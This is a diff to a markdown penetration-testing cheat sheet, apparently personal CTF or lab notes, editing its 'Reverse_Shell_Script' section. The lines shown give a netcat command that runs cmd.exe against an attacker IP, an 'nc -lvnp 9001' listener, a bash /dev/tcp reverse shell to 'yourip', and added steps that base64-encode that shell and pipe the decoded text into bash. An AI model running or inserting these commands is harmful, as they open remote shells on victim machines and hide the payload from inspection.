@@ -237,9 +237,13 @@ __Download the reverse shell in windows__
     - __`new.exe -nv <attacker ip> 1234 -e cmd.exe`__
 
 
-# 15. Reverse_Shell_Script <a name="rev"></a>
+# 15. Reverse_Shell_Script <a name="rev"></a> nc -lvnp 9001
 - [revshells.com](https://revshells.com)
 - __`bash -c 'bash -i >& /dev/tcp/yourip/9001 0>&1'`__
+- __Sometimes you need to encode__
+  - __`bash -c 'bash -i >& /dev/tcp/yourip/9001 0>&1'`__ __save this in tmp file__
+  - __`cat tmp | base64 -w 0`__
+  - __`echo <encoded_command> | base64 -d | bash`__
 
 
 
